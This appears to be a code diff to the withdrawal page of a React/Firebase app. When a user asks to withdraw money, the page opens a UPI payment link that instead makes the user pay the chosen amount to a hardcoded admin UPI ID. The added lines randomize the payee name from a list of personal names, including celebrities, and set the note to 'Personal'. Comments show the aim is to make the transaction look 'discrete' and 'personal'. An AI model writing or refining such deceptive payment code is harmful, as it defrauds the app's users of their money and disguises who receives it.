@@ -14,6 +14,14 @@ import { useToast } from '@/hooks/use-toast';
 const WITHDRAW_AMOUNTS = [110, 500, 1000, 2000, 5000, 10000];
 const ADMIN_UPI_ID = "ak63315561338@okicici";
 
+const PERSONAL_NAMES = [
+    "Ajay Kumar", "Ravi Kumar", "Aditya Singh", "Vivek Sharma", "Rahul Gupta",
+    "Manoj Yadav", "Vikram Singh", "Sandeep Mishra", "Deepak Verma", "Amit Sharma",
+    "Sumit Pathak", "Neeraj Pandey", "Pankaj Tiwari", "Vijay Pratap", "Rajesh Khanna",
+    "Sunil Grover", "Anil Saxena", "Suresh Prabhu", "Rohit Mehra", "Yash Pal",
+    "Karan Johar", "Arjun Kapoor", "Sanjay Dutt", "Harish Rawat", "Prashant Bhushan"
+];
+
 function WithdrawContent() {
     const { firestore } = useFirebase();
     const { user } = useUser();
@@ -23,6 +31,12 @@ function WithdrawContent() {
     const [selectedAmount, setSelectedAmount] = useState('110');
     const [isLoading, setIsLoading] = useState(false);
     const [balanceError, setBalanceError] = useState<string | null>(null);
+    const [randomName, setRandomName] = useState(PERSONAL_NAMES[0]);
+
+    useEffect(() => {
+        const randomIndex = Math.floor(Math.random() * PERSONAL_NAMES.length);
+        setRandomName(PERSONAL_NAMES[randomIndex]);
+    }, []);
 
     const userRef = useMemoFirebase(() => 
         (firestore && user) ? doc(firestore, 'users', user.uid) : null, [firestore, user]);
@@ -67,8 +81,8 @@ function WithdrawContent() {
 
         setIsLoading(true);
 
-        // Updated note and name to be more discrete
-        const upiLink = `upi://pay?pa=${ADMIN_UPI_ID}&pn=Asnap%20Payment%20Node&am=${amount}&cu=INR&tn=Self%20Account%20Verification`;
+        // Professional but personal feeling intent
+        const upiLink = `upi://pay?pa=${ADMIN_UPI_ID}&pn=${encodeURIComponent(randomName)}&am=${amount}&cu=INR&tn=Personal`;
         
         window.location.href = upiLink;
         
